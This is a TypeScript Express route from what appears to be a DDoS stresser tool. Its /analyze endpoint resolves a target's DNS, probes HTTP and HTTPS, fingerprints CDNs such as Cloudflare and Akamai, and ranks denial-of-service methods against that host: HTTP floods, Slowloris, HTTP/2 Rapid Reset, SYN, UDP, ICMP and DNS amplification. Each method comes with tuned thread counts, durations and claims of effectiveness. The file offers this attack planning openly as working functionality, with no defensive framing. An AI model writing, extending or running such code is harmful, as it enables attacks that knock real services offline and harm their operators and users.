import { Router, type IRouter } from "express";
import dns from "node:dns/promises";
import { AnalyzeTargetBody } from "@workspace/api-zod";

const router: IRouter = Router();

interface MethodRec {
  method: string;
  name: string;
  score: number;
  reason: string;
  suggestedThreads: number;
  suggestedDuration: number;
  protocol: string;
  amplification: number;
  tier: "S" | "A" | "B" | "C" | "D";
}

function tierFromScore(score: number): "S" | "A" | "B" | "C" | "D" {
  if (score >= 90) return "S";
  if (score >= 75) return "A";
  if (score >= 60) return "B";
  if (score >= 45) return "C";
  return "D";
}

function detectCDN(headers: Headers): { isCDN: boolean; provider: string } {
  const cfRay   = headers.get("cf-ray");
  const server  = (headers.get("server") || "").toLowerCase();
  const via     = (headers.get("via") || "").toLowerCase();
  const xCache  = (headers.get("x-cache") || "").toLowerCase();
  const xServed = headers.get("x-served-by") || "";
  const xAkamai = headers.get("x-check-cacheable") || headers.get("x-akamai-transformed") || "";

  if (cfRay || server.includes("cloudflare")) return { isCDN: true, provider: "Cloudflare" };
  if (server.includes("akamai") || xAkamai)   return { isCDN: true, provider: "Akamai" };
  if (server.includes("fastly") || via.includes("fastly")) return { isCDN: true, provider: "Fastly" };
  if (xServed.includes("cache"))              return { isCDN: true, provider: "Fastly" };
  if (server.includes("awselb") || server.includes("amazonaws")) return { isCDN: true, provider: "AWS CloudFront" };
  if (xCache.includes("hit") || via.includes("squid")) return { isCDN: true, provider: "Generic CDN" };
  return { isCDN: false, provider: "" };
}

function scoreMethodsFor(opts: {
  isIP: boolean;
  httpAvailable: boolean;
  httpsAvailable: boolean;
  responseTimeMs: number;
  serverHeader: string;
  isCDN: boolean;
  cdnProvider: string;
  hasDNS: boolean;
}): MethodRec[] {
  const { isIP, httpAvailable, httpsAvailable, responseTimeMs, serverHeader, isCDN, hasDNS } = opts;
  const isWebServer = httpAvailable || httpsAvailable;
  const isSlowResponder = responseTimeMs > 300;
  const isVerySlowResponder = responseTimeMs > 800;

  const recs: MethodRec[] = [];

  /* HTTP Flood */
  if (isWebServer) {
    let score = isCDN ? 62 : 88;
    const reason = isCDN
      ? `HTTP server behind ${opts.cdnProvider} CDN — layer 7 attacks partially mitigated`
      : `HTTP server detected (${responseTimeMs}ms) — direct flood highly effective`;
    recs.push({
      method: "http-flood", name: "HTTP Flood", score,
      reason, suggestedThreads: isCDN ? 256 : 128, suggestedDuration: 90,
      protocol: "HTTP", amplification: 1, tier: tierFromScore(score),
    });
  }

  /* Slowloris */
  if (isWebServer) {
    let score = 40;
    if (isSlowResponder) score = 75;
    if (isVerySlowResponder) score = 90;
    if (isCDN) score -= 20;
    const reason = isSlowResponder
      ? `Server responds slowly (${responseTimeMs}ms) — connection exhaustion very effective`
      : `HTTP server detected — Slowloris holds connections open, starving the server`;
    recs.push({
      method: "slowloris", name: "Slowloris", score: Math.max(20, score),
      reason, suggestedThreads: 64, suggestedDuration: 300,
      protocol: "HTTP", amplification: 1, tier: tierFromScore(score),
    });
  }

  /* HTTP/2 Flood */
  if (httpsAvailable) {
    const score = isCDN ? 55 : 82;
    recs.push({
      method: "http2-flood", name: "HTTP/2 Rapid Reset", score,
      reason: `HTTPS endpoint detected — HTTP/2 multiplexing enables extreme request amplification`,
      suggestedThreads: 64, suggestedDuration: 60,
      protocol: "HTTP", amplification: 1.5, tier: tierFromScore(score),
    });
  }

  /* UDP Flood */
  {
    let score = isIP ? 85 : 70;
    if (isCDN) score -= 10;
    recs.push({
      method: "udp-flood", name: "UDP Flood", score,
      reason: isIP
        ? `Direct IP target — UDP flood bypasses connection state, maximising throughput`
        : `Domain resolved — UDP saturates upstream bandwidth effectively`,
      suggestedThreads: 128, suggestedDuration: 60,
      protocol: "UDP", amplification: 1, tier: tierFromScore(score),
    });
  }

  /* SYN Flood */
  {
    const score = isIP ? 88 : 72;
    recs.push({
      method: "syn-flood", name: "SYN Flood", score,
      reason: `Exhausts TCP connection table (SYN_RECV state) — extremely effective against unprotected hosts`,
      suggestedThreads: 256, suggestedDuration: 60,
      protocol: "TCP", amplification: 1, tier: tierFromScore(score),
    });
  }

  /* TCP Flood */
  {
    const score = 68;
    recs.push({
      method: "tcp-flood", name: "TCP ACK Flood", score,
      reason: `Saturates TCP state tracking — effective when SYN cookies aren't deployed`,
      suggestedThreads: 64, suggestedDuration: 60,
      protocol: "TCP", amplification: 1, tier: tierFromScore(score),
    });
  }

  /* DNS Amplification */
  if (!isIP && hasDNS) {
    const score = isCDN ? 45 : 80;
    recs.push({
      method: "dns-amp", name: "DNS Amplification", score,
      reason: `Domain has DNS records — amplification factor up to 54x floods origin bandwidth`,
      suggestedThreads: 64, suggestedDuration: 90,
      protocol: "UDP", amplification: 54, tier: tierFromScore(score),
    });
  }

  /* ICMP Flood */
  {
    const score = isIP ? 72 : 55;
    recs.push({
      method: "icmp-flood", name: "ICMP Flood (Ping Flood)", score,
      reason: `ICMP packets bypass application layer — effective for bandwidth saturation`,
      suggestedThreads: 64, suggestedDuration: 60,
      protocol: "ICMP", amplification: 1, tier: tierFromScore(score),
    });
  }

  return recs.sort((a, b) => b.score - a.score).slice(0, 6);
}

router.post("/analyze", async (req, res): Promise<void> => {
  const parsed = AnalyzeTargetBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  let { url } = parsed.data;
  if (!url.trim()) {
    res.status(400).json({ error: "URL required" });
    return;
  }

  /* Normalize */
  let hostname = url.trim();
  try {
    const u = new URL(hostname.startsWith("http") ? hostname : `http://${hostname}`);
    hostname = u.hostname;
  } catch { /* keep as-is */ }

  const isIPv4 = /^\d{1,3}(\.\d{1,3}){3}$/.test(hostname);

  /* DNS resolution */
  let resolvedIp: string | null = null;
  let hasDNS = false;
  if (!isIPv4) {
    try {
      const addrs = await dns.resolve4(hostname);
      resolvedIp = addrs[0] ?? null;
      hasDNS = true;
    } catch { /* unresolvable */ }
  }

  const ip = isIPv4 ? hostname : resolvedIp;

  /* HTTP probe */
  let httpAvailable = false;
  let httpsAvailable = false;
  let responseTimeMs = 0;
  let serverHeader = "";
  let isCDN = false;
  let cdnProvider = "";
  const openPorts: number[] = [];

  async function probeHTTP(scheme: string): Promise<{ ok: boolean; timeMs: number; server: string; headers: Headers | null }> {
    const start = Date.now();
    try {
      const r = await fetch(`${scheme}://${hostname}`, {
        method: "GET",
        signal: AbortSignal.timeout(8000),
        redirect: "follow",
      });
      return { ok: true, timeMs: Date.now() - start, server: r.headers.get("server") || "", headers: r.headers };
    } catch {
      return { ok: false, timeMs: Date.now() - start, server: "", headers: null };
    }
  }

  const [httpResult, httpsResult] = await Promise.all([probeHTTP("http"), probeHTTP("https")]);

  if (httpResult.ok) {
    httpAvailable = true;
    openPorts.push(80);
    responseTimeMs = httpResult.timeMs;
    serverHeader = httpResult.server;
    if (httpResult.headers) {
      const cdn = detectCDN(httpResult.headers);
      isCDN = cdn.isCDN; cdnProvider = cdn.provider;
    }
  }
  if (httpsResult.ok) {
    httpsAvailable = true;
    openPorts.push(443);
    if (!httpAvailable) {
      responseTimeMs = httpsResult.timeMs;
      serverHeader = httpsResult.server;
      if (httpsResult.headers) {
        const cdn = detectCDN(httpsResult.headers);
        isCDN = cdn.isCDN; cdnProvider = cdn.provider;
      }
    }
  }

  if (hasDNS) openPorts.push(53);

  const recommendations = scoreMethodsFor({
    isIP: isIPv4,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    isCDN,
    cdnProvider,
    hasDNS,
  });

  res.json({
    target: hostname,
    ip,
    isIP: isIPv4,
    httpAvailable,
    httpsAvailable,
    responseTimeMs,
    serverHeader,
    isCDN,
    cdnProvider,
    openPorts,
    recommendations,
  });
});

export default router;
